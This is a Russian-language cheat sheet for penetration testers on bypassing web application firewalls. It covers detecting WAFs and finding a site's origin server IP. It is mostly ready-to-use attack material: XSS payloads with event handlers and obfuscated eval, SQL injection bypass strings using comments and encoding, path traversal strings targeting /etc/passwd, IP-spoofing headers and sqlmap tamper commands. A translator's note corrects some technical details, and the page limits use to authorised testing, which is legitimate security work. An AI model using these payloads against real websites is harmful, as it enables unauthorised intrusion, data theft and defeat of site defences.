<a id="-waf-bypass-cheatsheet"></a>
# 🛡️ Справочник по обходу WAF

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

> **Уточнение к оригиналу.** Совпадение IP, сертификата или favicon даёт кандидата на исходный сервер, но само по себе не доказывает обход WAF. Отсутствие IP в облачных диапазонах тоже не является доказательством: облачный хостинг и CDN — разные признаки. Заголовки подстановки IP, кодирование и разбиение запросов действуют только при соответствующей обработке приложением и прокси. Показанные команды и полезные нагрузки сохранены.

> **О версиях и примерах.** В [RFC 3629](https://www.rfc-editor.org/rfc/rfc3629.html) байты C0/C1 недопустимы: показанная «UTF-8»-последовательность является старым некорректным вариантом, а не стандартным кодированием. В [MySQL](https://dev.mysql.com/doc/refman/8.0/en/comments.html) синтаксис комментариев зависит от формы и версии; разрыв ключевого слова не гарантирует допустимый SQL, а запись без пробела после номера версии может вызывать предупреждение. [Shodan использует MurmurHash3 от Base64 favicon](https://blog.shodan.io/deep-dive-http-favicon/), а не MD5. Поля и команды [нового Censys CLI](https://docs.censys.com/docs/platform-cli) отличаются от старых примеров; сверяйте используемую версию.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Web Application Firewall Bypass
```

---

<a id="-what-is-waf-bypass"></a>
## 🎯 Что такое обход WAF

Приёмы **обхода WAF** позволяют специалистам по тестированию на проникновение обходить межсетевые экраны веб-приложений (Web Application Firewalls), обращаться к исходному серверу или доставлять полезные нагрузки (payloads).

<a id="common-wafs"></a>
### Распространённые WAF
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

<a id="-waf-detection"></a>
## 🔍 Обнаружение WAF

<a id="wafw00f"></a>
### wafw00f
```bash
# Обнаружить WAF
wafw00f https://target.com

# Подробный вывод
wafw00f https://target.com -v

# Проверить все известные WAF
wafw00f https://target.com -a
```

<a id="manual-detection"></a>
### Ручное обнаружение
```bash
# Проверить заголовки ответа
curl -I https://target.com

# Ищите:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

<a id="-origin-ip-discovery"></a>
## 🌐 Поиск IP-адреса исходного сервера

<a id="dns-history"></a>
### История DNS
```bash
# Сервисы для проверки:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

<a id="ssl-certificate-search"></a>
### Поиск по SSL-сертификатам
```bash
# Поиск сертификатов в Censys.io
# Ищите target.com в сертификате

# crt.sh — журналы прозрачности сертификатов (Certificate Transparency)
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI (интерфейс командной строки)
censys search "parsed.names: target.com"
```

<a id="shodancensys"></a>
### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan — поиск по хешу SSL-сертификата
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Поиск: services.tls.certificates.leaf_data.subject.common_name: target.com
```

<a id="email-headers"></a>
### Заголовки электронной почты
```bash
# Подписаться на рассылку или уведомления
# Проверить заголовки письма на наличие IP исходного сервера

# Ищите:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

<a id="subdomains-without-cdn"></a>
### Поддомены без CDN
```bash
# Найти поддомены
subfinder -d target.com -o subs.txt

# Проверить, какие адреса находятся за CDN
cat subs.txt | httpx -ip

# Ищите:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

<a id="favicon-hash"></a>
### Хеш favicon
```bash
# Получить хеш favicon
curl -s https://target.com/favicon.ico | md5sum

# Поиск в Shodan по хешу favicon
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Поиск в Shodan
shodan search "http.favicon.hash:HASH_VALUE"
```

<a id="ipv6-bypass"></a>
### Обход через IPv6
```bash
# WAF может не охватывать IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

<a id="cloud-ranges"></a>
### Диапазоны облачных адресов
```bash
# Скачать диапазоны облачных IP-адресов
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# Если IP цели не входит в облачные диапазоны — возможный исходный сервер
```

---

<a id="-payload-encoding-bypass"></a>
## 🔓 Обход с помощью кодирования полезной нагрузки

<a id="url-encoding"></a>
### URL-кодирование
```
# Однократное кодирование
<script> → %3Cscript%3E

# Двойное кодирование
<script> → %253Cscript%253E

# Смешанное кодирование
<script> → %3Cscr%69pt%3E
```

<a id="unicode-encoding"></a>
### Кодирование Unicode
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Управляющие последовательности Unicode
<script> → \u003cscript\u003e

# Сущности HTML
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

<a id="case-manipulation"></a>
### Изменение регистра
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

<a id="null-bytes"></a>
### Нулевые байты
```
# Внедрение нулевого байта
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

<a id="comments"></a>
### Комментарии
```sql
# Комментарии SQL
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Встроенные комментарии
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

<a id="whitespace-alternatives"></a>
### Альтернативы пробелам
```sql
# Табуляция, перевод строки, возврат каретки
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Знак плюс
UNION+SELECT
1'+OR+1=1--
```

---

<a id="-waf-specific-bypasses"></a>
## 🔥 Обход отдельных правил WAF

<a id="xss-bypass"></a>
### Обход фильтрации XSS
```html
# Стандартный вариант заблокирован
<script>alert(1)</script>

# Варианты для проверки обхода
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Без круглых скобок
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Без alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

<a id="sqli-bypass"></a>
### Обход фильтрации SQLi
```sql
# Обход фильтрации UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Обход через комментарии
-- → #
-- → --+
-- → --%00
-- → /**/

# Обход с логическими выражениями
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Комментарии с условием версии (MySQL)
/*!50000SELECT*/ → Выполняется только при MySQL >= 5.0
```

<a id="path-traversal-bypass"></a>
### Обход защиты от выхода за пределы каталога
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

<a id="-http-techniques"></a>
## 🛠️ Приёмы HTTP

<a id="http-parameter-pollution"></a>
### Загрязнение HTTP-параметров (HPP)
```http
# Повторяющиеся параметры
?id=1&id=2
?id=1&ID=2

# Внедрение массива
?id[]=1&id[]=2
?id=1&id=2&id=3
```

<a id="http-method-tampering"></a>
### Изменение метода HTTP
```bash
# Изменить метод
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Заголовки переопределения метода
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

<a id="header-manipulation"></a>
### Изменение заголовков
```http
# Заголовки для подстановки IP-адреса
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Несогласованная обработка Content-Type
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

<a id="chunked-encoding"></a>
### Передача по частям (chunked encoding)
```http
Transfer-Encoding: chunked

4
test
0
```

---

<a id="-tools"></a>
## 🛠️ Инструменты

| Инструмент | Назначение |
|------|---------|
| **wafw00f** | Обнаружение WAF |
| **CloudFlair** | Поиск исходного сервера за Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | Поиск по истории DNS |
| **WhatWaf** | Обнаружение и обход WAF |
| **sqlmap --tamper** | Скрипты обхода фильтрации SQLi |

<a id="sqlmap-tamper-scripts"></a>
### Скрипты изменения запросов sqlmap (tamper)
```bash
# Использовать скрипты tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Несколько скриптов tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

| Приём | Применение |
|-----------|----------|
| История DNS | Поиск IP-адреса исходного сервера |
| Поиск SSL | Поиск сертификатов через Censys/Shodan |
| Перечисление поддоменов | Поиск поддоменов без CDN |
| Кодирование | Обход фильтров |
| Изменение регистра | Обход простых правил |
| Комментарии | Разделение ключевых слов |

---

<a id="-resources"></a>
## 📚 Ресурсы

- [PayloadsAllTheThings: WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks: WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP: обход WAF](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ Исследуйте способы обхода WAF!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
